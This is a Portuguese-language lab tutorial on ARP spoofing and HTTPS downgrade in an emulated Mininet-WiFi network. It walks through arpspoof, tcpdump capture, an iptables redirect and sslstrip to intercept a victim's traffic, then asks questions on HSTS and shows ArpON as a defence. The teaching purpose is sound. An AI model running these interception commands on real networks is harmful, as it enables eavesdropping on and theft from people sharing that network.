************
ARP Spoofing
************
 
ARP Spoofing e Downgrade de Protocolo
-------------

.. Note::

    **Nesta demo você irá aprender como realizar o ataque de ARP Spoofing e também como realizar o downgrade de protocolo:** 

    **Requisitos:** 
    
    - Mininet-WiFi - https://github.com/intrig-unicamp/mininet-wifi
    - dsniff
    - arpon
    - sslstrip
    - curl
    
    **A VM disponível na página do código-fonte do Mininet-WiFi possui todos os requisitos necessários para reprodução deste documento**

Antes de tudo você precisa identificar a topologia de rede que será gerada através do código abaixo:

.. code:: python

    #!/usr/bin/python

    '''@author: Ramon Fontes
       @email: ramon.fontes@imd.ufrn.br'''

    from mininet.log import setLogLevel, info
    from mn_wifi.node import OVSKernelAP
    from mn_wifi.link import wmediumd
    from mn_wifi.cli import CLI
    from mn_wifi.net import Mininet_wifi


    def topology():
        "Create a network."
        net = Mininet_wifi()

        info("*** Creating nodes\n")
        ap1 = net.addAccessPoint('ap1', ssid='new-ssid', mode='g',
                                 channel='1', position='10,10,0',
                                 failMode="standalone")
        sta1 = net.addStation('sta1', position='10,20,0')
        sta2 = net.addStation('sta2', position='10,30,0')

        info("*** Configuring wifi nodes\n")
        net.configureWifiNodes()

        info("*** Starting network\n")
        net.build()
        net.addNAT().configDefault()
        ap1.start([])

        sta2.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')

        info("*** Running CLI\n")
        CLI(net)

        info("*** Stopping network\n")
        net.stop()


    if __name__ == '__main__':
        setLogLevel('info')
        topology()


Neste tutorial, vamos simular os passos ilustrados na figura de forma a mostrar na prática como ocorre o ataque de ARP Spoofing. Para tanto, vamos considerar executar o script acima. 

Considerando que o nome do arquivo seja `arp.py` você deve executá-lo da seguinte forma:

.. code:: console

    sudo python arp.py
    

Em seguida, faremos uma tentativa de ping a partir de `sta1` para o endereço 8.8.8.8.

.. code:: console

    mininet-wifi> sta1 ping -c1 8.8.8.8

    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=68.8 ms
    --- 8.8.8.8 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 68.893/68.893/68.893/0.000 ms


Como é possível perceber o ping foi realizado com sucesso. Agora, vamos verificar a tabela ARP de `sta1`. Na tabela deverá constar o endereço IP e também o endereço MAC do gateway padrão de `sta1`.


.. code:: console

    mininet-wifi> sta1 arp -a
    _gateway (10.0.0.3) at 0a:1e:54:0e:66:96 [ether] on sta1-wlan0


Então, vamos simular o ataque de ARP Spoofing e fazer com que `sta1` entenda que o seu gateway na verdade é `sta2`. Primeiro, abra 2 (dois) terminais para `sta2`.

.. code:: console

    mininet-wifi> xterm sta2 sta2


Então, no terminal de `sta2` execute o arpspoof, conforme abaixo.

.. code:: console

    sta2# arpspoof -i sta2-wlan0 -t 10.0.0.1 10.0.0.3


O comando acima induz 10.0.0.1, que é a vítima, a entender que 10.0.0.2, ou seja, `sta2`, representa o endereço do gateway padrão. 

Então, após alguns segundos verificamos novamente a tabela ARP de `sta1`.

.. code:: console

    mininet-wifi> sta1 arp -a
    _gateway (10.0.0.3) at 02:00:00:00:01:00 [ether] on sta1-wlan0
    ? (10.0.0.2) at 02:00:00:00:01:00 [ether] on sta1-wlan0


Aqui, já podemos notar que o endereço MAC do gateway padrão já não é mais o mesmo do identificado anteriormente. 

Agora, realizamos um novo ping de `sta1` para o endereço público 8.8.8.8, ao mesmo tempo em que utilizamos o tcpdump no outro terminal de `sta2` para verificar se `sta2` está recebendo todo tráfego enviado gratuitamente pela vítima.

.. code:: console

    sta2# tcpdump -i sta2-wlan0
    20:30:34.970402 IP 10.0.0.1 > alpha-Inspiron: ICMP echo request, id 12251,seq 8, length 64
    20:30:34.971552 IP alpha-Inspiron > 10.0.0.1: ICMP echo reply, id 12251, seq 8, length 64
    20:30:35.430387 ARP, Reply _gateway is-at 02:00:00:00:01:00 (oui Unknown), length 28
    20:30:35.972565 IP 10.0.0.1 > alpha-Inspiron: ICMP echo request, id 12251,seq 9, length 64
    20:30:35.973722 IP alpha-Inspiron > 10.0.0.1: ICMP echo reply, id 12251, seq 9, length 64
    20:30:36.973743 IP 10.0.0.1 > alpha-Inspiron: ICMP echo request, id 12251, seq 10, length 64
    20:30:36.974884 IP alpha-Inspiron > 10.0.0.1: ICMP echo reply, id 12251, seq 10, length 64


.. code:: console

    mininet-wifi> sta1 ping -c10 8.8.8.8


Após alguns pacotes enviados por `sta1` é possível notar que `sta2` passou a receber os pacotes enviados por `sta1`, pois `sta1` passou a entender que `sta2` seria o verdadeiro gateway padrão. A partir deste momento, `sta2`, o atacante, pode inclusive utilizar de simples ferramentas como `sslstrip` para realizar ataques em cima do protocolo HTTPS (Hyper Text Transfer Protocol Secure) via downgrade de protocolo.


Para interceptar o tráfego não criptografado, é necessário fazer o downgrade da conexão da vítima de HTTPS para HTTP. Isso é possível através do `sslstrip`. Primeiro, é necessário redirecionar o tráfego de saída na porta 80 para 8080 e, em seguida, iniciar o `sslstrip` na porta 8080.

.. code:: console

    mininet-wifi> xterm sta2


Já no terminal aberto de `sta2` digite:

.. code:: console

    sta2# iptables -t nat -p tcp -A PREROUTING --destination-port 80 -j REDIRECT --to-port 8080


E depois:

.. code:: console

    sta2# sslstrip -l 8080

    sslstrip 0.9 by Moxie Marlinspike running...


Na máquina da vítima, use o `curl` para enviar uma solicitação GET para http://globo.com.

.. Note::

   Caso obter algum erro na etapa abaixo, tente realizar um ping para globo.com a partir de sta1. Se não houver êxito no ping adicione entrada de servidor DNS em /etc/resolv.conf também a partir de sta1.


.. code:: console

    mininet-wifi> sta1 curl -vvv http://globo.com
    *   Trying 186.192.90.12:80...
    * TCP_NODELAY set
    * Connected to globo.com (186.192.90.12) port 80 (#0)
    > GET / HTTP/1.1
    > Host: globo.com
    > User-Agent: curl/7.68.0
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 301 Moved Permanently
    < Date: Wed, 03 Mar 2021 00:03:21 GMT
    < Content-Type: text/html
    < Content-Length: 178
    < Connection: keep-alive
    < Cache-Control: max-age=600
    < Location: http://www.globo.com/
    < 
    <html>
    <head><title>301 Moved Permanently</title></head>
    <body bgcolor="white">
    <center><h1>301 Moved Permanently</h1></center>
    <hr><center>nginx</center>
    </body>
    </html>
    * Connection #0 to host globo.com left intact
    

Como é possível notar, a solicitação foi redirecionada para http://www.globo.com/. Outro GET nesta nova URL irá retornar o conteúdo da página não criptografado. 

O ataque agora está completo: podemos visualizar o tráfego não criptografado entre a vítima e o site vulnerável usando HTTPS. No diretório onde você executou o sslstrip você também poderá observar um arquivo chamado de sslstrip.log. Este arquivo possui todas as informações capturadas pelo sslstrip.


.. admonition:: Perguntas
    
    - Q1. Comente sobre o ataque de downgrade de protocolo. Diga  como ele funciona.
    - Q2. O que seria o HTTP Strict Transport Security (HSTS) e como ele seria útil no cenário prático realizado acima?
    - Q3. Anexe duas imagens do wireshark onde, do lado do atacante, mostre requisições de tráfego criptografado e também requisições de tráfego descriptografado.


Como evitar o ARP Spoofing
-------------

O ataque de ARP Spoofing pode ser evitado com o uso de ferramentas como ARP handler inspection (ArpON). Por exemplo, você pode executar o ArpON a partir de `sta1`, conforme abaixo:

.. code:: console

    mininet-wifi> xterm sta1
    arpon -D -i sta1-wlan0


Caso houver um ataque em execução será possível observá-lo após executar o arpon, conforme ilustrado abaixo:


.. code:: console

    arpon -D -i sta1-wlan0
    Oct 30 10:01:41 [INFO] Start DARPI on sta1-wlan0
    Oct 30 10:01:41 [INFO] CLEAN, 10.0.0.3 was at 52:1e:e8:62:58:11 on sta1-wlan0
    Oct 30 10:01:53 [INFO] DENY, 10.0.0.3 was at 2:0:0:0:1:0 on sta1-wlan0
    Oct 30 10:01:53 [INFO] ALLOW, 10.0.0.3 is at 52:1e:e8:62:58:11 on sta1-wlan0
    Oct 30 10:01:55 [INFO] DENY, 10.0.0.3 was at 2:0:0:0:1:0 on sta1-wlan0
